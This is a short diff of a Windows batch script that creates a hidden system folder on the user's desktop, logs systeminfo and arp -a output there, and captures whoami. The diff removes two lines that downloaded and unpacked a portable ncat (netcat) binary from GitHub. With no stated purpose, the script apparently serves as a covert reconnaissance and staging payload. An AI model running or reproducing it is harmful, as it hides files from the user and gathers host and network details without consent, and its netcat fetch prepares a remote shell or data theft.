@@ -1,7 +1,5 @@
 mkdir %userprofile%\desktop\bb
 attrib +s +h +i +x %userprofile%\desktop\bb
-curl -o -l https://github.com/l-urk/netcat/blob/main/ncat-portable-5.59BETA1.zip %userprofile%\desktop\bb\ncat-portable-5.59BETA1.zip
-tar -xf %userprofile%\desktop\bb\ncat-portable-5.59BETA1.zip
 echo systeminfo >> %userprofile%\desktop\bb\systeminfo.txt
 echo arp -a >> %userprofile%\desktop\bb\arp.txt
 for /f "delims=" %n in ('whoami') do set name=%n
